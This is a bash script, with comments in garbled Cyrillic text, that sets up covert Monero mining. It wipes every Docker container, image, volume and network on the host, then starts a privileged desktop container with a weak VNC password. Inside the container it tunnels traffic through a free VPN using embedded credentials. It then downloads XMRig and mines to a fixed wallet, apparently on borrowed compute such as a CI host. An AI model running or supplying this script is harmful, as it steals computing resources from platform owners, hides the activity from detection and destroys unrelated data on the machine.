bash -c "$(cat <<'EOF'
#!/bin/bash

# === 0. –ü–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ Docker –∏ —Å—Ä–µ–¥—ã –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º ===
echo "[üßπ] –ü–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ Docker-—Å—Ä–µ–¥—ã –∏ —Å—Ç–∞—Ä—ã—Ö –¥–∞–Ω–Ω—ã—Ö..."
sudo docker ps -aq | xargs -r sudo docker stop
sudo docker ps -aq | xargs -r sudo docker rm -f
sudo docker images -aq | xargs -r sudo docker rmi -f
sudo docker volume ls -q | xargs -r sudo docker volume rm
sudo docker network ls | grep -v 'bridge\|host\|none' | awk '{print $1}' | xargs -r sudo docker network rm
rm -rf ~/dockercom

# === 1. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ Docker –∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –ø–∞–∫–µ—Ç–æ–≤ ===
echo "[+] –£—Å—Ç–∞–Ω–æ–≤–∫–∞ Docker –∏ –Ω—É–∂–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤..."
sudo apt update && sudo apt install -y docker.io docker-compose openvpn curl unzip

# === 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Docker ===
if ! command -v docker &> /dev/null; then
  echo "[-] Docker –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω. –ü—Ä–µ—Ä—ã–≤–∞–Ω–∏–µ."; exit 1
fi

# === 3. –°–æ–∑–¥–∞–Ω–∏–µ —Ä–∞–±–æ—á–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –∏ docker-compose —Ñ–∞–π–ª–∞ ===
mkdir -p ~/dockercom && cd ~/dockercom || exit 1
cat > ubuntu_gui.yml <<EOL
version: '3.8'
services:
  ubuntu-gui:
    image: dorowu/ubuntu-desktop-lxde-vnc:bionic
    container_name: ubuntu_gui
    ports:
      - "6080:80"
      - "5900:5900"
    environment:
      - VNC_PASSWORD=pass123
    volumes:
      - ./data:/data
      - /dev/net/tun:/dev/net/tun
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun
    privileged: true
    shm_size: "2g"
EOL

# === 4. –ó–∞–ø—É—Å–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ ===
echo "[+] –ó–∞–ø—É—Å–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞..."
sudo docker-compose -f ubuntu_gui.yml up -d
sudo docker ps

# === 5. –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ VPN –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ ===
echo "[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ VPN –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞..."
sudo docker exec -i ubuntu_gui bash <<'EOC'
apt update && apt install -y openvpn curl unzip resolvconf
cd /tmp && curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook
echo -e "vpnbook\ncf324xw" > vpnbook/auth.txt
[ ! -c /dev/net/tun ] && echo "‚ùå TUN device not available." && exit 1
echo "nameserver 1.1.1.1" > /etc/resolv.conf
openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
    --auth-user-pass vpnbook/auth.txt \
    --daemon \
    --route-up '/etc/openvpn/update-resolv-conf' \
    --down '/etc/openvpn/update-resolv-conf'
sleep 45
echo "üåê –í–Ω–µ—à–Ω–∏–π IP:"
curl -s ifconfig.me
EOC

# === 6. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏ –∑–∞–ø—É—Å–∫ XMRig ===
echo "[+] –£—Å—Ç–∞–Ω–æ–≤–∫–∞ XMRig –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ..."
sudo docker exec -i ubuntu_gui bash <<'EOM'
POOL="gulf.moneroocean.stream:10128"
WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
PASSWORD="Github"
XMRIG_VERSION="6.22.2"
ARCHIVE_NAME="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
cd /tmp && curl -LO "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE_NAME}"
tar -xzf "$ARCHIVE_NAME" && cd "xmrig-${XMRIG_VERSION}"
cat > config.json <<EOF
{
  "api": { "id": null, "worker-id": "" },
  "autosave": false,
  "background": false,
  "colors": true,
  "randomx": { "1gb-pages": true, "rdmsr": true, "wrmsr": true, "numa": true },
  "cpu": true,
  "donate-level": 0,
  "log-file": null,
  "pools": [
    {
      "url": "${POOL}",
      "user": "${WALLET}",
      "pass": "${PASSWORD}",
      "algo": "rx",
      "tls": false,
      "keepalive": true,
      "nicehash": false
    }
  ],
  "print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "user-agent": null
}
EOF
chmod +x xmrig
echo "[*] –ó–∞–ø—É—Å–∫ –º–∞–π–Ω–∏–Ω–≥–∞..."
./xmrig -c config.json
EOM

# === 7. –§–∏–Ω–∞–ª ===
echo
echo "[‚úÖ] –í—Å—ë –∑–∞–ø—É—â–µ–Ω–æ."
echo "VNC-–¥–æ—Å—Ç—É–ø: http://localhost:6080 (–ø–∞—Ä–æ–ª—å: pass123)"
EOF
)"
